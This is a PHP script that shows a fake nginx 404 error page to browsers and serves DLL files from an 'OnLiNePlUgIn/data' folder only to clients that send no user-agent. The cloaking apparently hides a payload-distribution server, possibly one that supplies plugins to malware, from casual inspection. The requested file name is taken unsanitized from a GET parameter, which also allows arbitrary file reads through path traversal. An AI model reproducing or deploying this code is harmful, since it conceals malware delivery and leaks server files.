<?php
$page_404 = '<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx</center>
</body>
</html>
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
';
if (empty($_SERVER['HTTP_USER_AGENT'])) {
    $key = $_GET['plugin'];
    $file = fopen('OnLiNePlUgIn/data/' . $key . '.dll', "r");
    header("Content-Type: application/octet-stream");
    header("Accept-Ranges: bytes");
    header("Accept-Length: " . filesize('OnLiNePlUgIn/data/' . $key . '.dll'));
    header("Content-Disposition: attachment; filename=$key.dll");
    echo fread($file, filesize('OnLiNePlUgIn/data/' . $key . '.dll'));
    fclose($file);
} else {
    echo $page_404;
}
?>